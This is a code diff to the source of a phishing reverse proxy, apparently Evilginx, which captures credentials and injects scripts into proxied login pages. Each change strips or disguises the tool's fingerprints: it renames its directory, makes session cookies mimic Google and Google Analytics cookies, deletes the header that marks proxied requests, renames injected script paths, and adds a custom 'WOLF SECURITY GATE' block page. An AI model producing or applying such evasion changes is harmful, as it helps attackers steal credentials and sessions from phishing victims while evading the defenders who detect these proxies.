@@ -50,7 +50,7 @@ const (
 )
 
 const (
-	HOME_DIR = ".evilginx"
+	HOME_DIR = ".core_data"
 )
 
 const (
@@ -140,7 +140,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		}
 	}
 
-	p.cookieName = strings.ToLower(GenRandomString(8)) // TODO: make cookie name identifiable
+	p.cookieName = "_ga_" + strings.ToUpper(GenRandomString(6))
 	p.sessions = make(map[string]*Session)
 	p.sids = make(map[string]int)
 
@@ -466,7 +466,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						return p.blockRequest(req)
 					}
 				}
-				req.Header.Set(p.getHomeDir(), o_host)
+				// header removed
 
 				if ps.SessionId != "" {
 					if s, ok := p.sessions[ps.SessionId]; ok {
@@ -656,7 +656,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 				// check for creds in request body
 				if pl != nil && ps.SessionId != "" {
-					req.Header.Set(p.getHomeDir(), o_host)
+					// header removed
 					body, err := ioutil.ReadAll(req.Body)
 					if err == nil {
 						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
@@ -910,6 +910,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					log.Warning("can't parse URL from 'Access-Control-Allow-Origin' header: %s", allow_origin)
 				}
 				resp.Header.Set("Access-Control-Allow-Credentials", "true")
+				resp.Header.Set("Server", p.cfg.cfg.GetString("general.server_header"))
 			}
 			var rm_headers = []string{
 				"Content-Security-Policy",
@@ -1169,11 +1170,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							//log.Debug("js_inject: hostname:%s path:%s", req_hostname, resp.Request.URL.Path)
 							js_id, _, err := pl.GetScriptInject(req_hostname, resp.Request.URL.Path, js_params)
 							if err == nil {
-								body = p.injectJavascriptIntoBody(body, "", fmt.Sprintf("/s/%s/%s.js", s.Id, js_id))
+								body = p.injectJavascriptIntoBody(body, "", fmt.Sprintf("/assets/%s/%s.js", s.Id, js_id))
 							}
 
 							log.Debug("js_inject: injected redirect script for session: %s", s.Id)
-							body = p.injectJavascriptIntoBody(body, "", fmt.Sprintf("/s/%s.js", s.Id))
+							body = p.injectJavascriptIntoBody(body, "", fmt.Sprintf("/assets/%s.js", s.Id))
 						}
 					}
 				}
@@ -1270,23 +1271,25 @@ func (p *HttpProxy) waitForRedirectUrl(session_id string) (string, bool) {
 }
 
 func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Response) {
-	var redirect_url string
-	if pl := p.getPhishletByPhishHost(req.Host); pl != nil {
-		redirect_url = p.cfg.PhishletConfig(pl.Name).UnauthUrl
-	}
-	if redirect_url == "" && len(p.cfg.general.UnauthUrl) > 0 {
-		redirect_url = p.cfg.general.UnauthUrl
-	}
+    var redirect_url string
+    if pl := p.getPhishletByPhishHost(req.Host); pl != nil {
+        redirect_url = p.cfg.PhishletConfig(pl.Name).UnauthUrl
+    }
+    if redirect_url == "" && len(p.cfg.general.UnauthUrl) > 0 {
+        redirect_url = p.cfg.general.UnauthUrl
+    }
 
-	if redirect_url != "" {
-		return p.javascriptRedirect(req, redirect_url)
-	} else {
-		resp := goproxy.NewResponse(req, "text/html", http.StatusForbidden, "")
-		if resp != nil {
-			return req, resp
-		}
-	}
-	return req, nil
+    if redirect_url != "" {
+        return p.javascriptRedirect(req, redirect_url)
+    } else {
+
+        wolf_gate := "<html><body style='background:#000;color:#39ff14;font-family:monospace;text-align:center;padding-top:20%'><h1 style='font-size:3em'>WOLF SECURITY GATE</h1><p style='font-size:1.2em'>UNAUTHORIZED ACCESS DETECTED - NODE: @Abdo_CMU</p><div style='border:1px solid #39ff14;display:inline-block;padding:10px'>ENCRYPTED CONNECTION ONLY</div></body></html>"
+        resp := goproxy.NewResponse(req, "text/html", http.StatusForbidden, wolf_gate)
+        if resp != nil {
+            return req, resp
+        }
+    }
+    return req, nil
 }
 
 func (p *HttpProxy) trackerImage(req *http.Request) (*http.Request, *http.Response) {
@@ -1985,5 +1988,5 @@ func getSessionCookieName(pl_name string, cookie_name string) string {
 	hash := sha256.Sum256([]byte(pl_name + "-" + cookie_name))
 	s_hash := fmt.Sprintf("%x", hash[:4])
 	s_hash = s_hash[:4] + "-" + s_hash[4:]
-	return s_hash
+	return "__Secure-GTSID"
 }
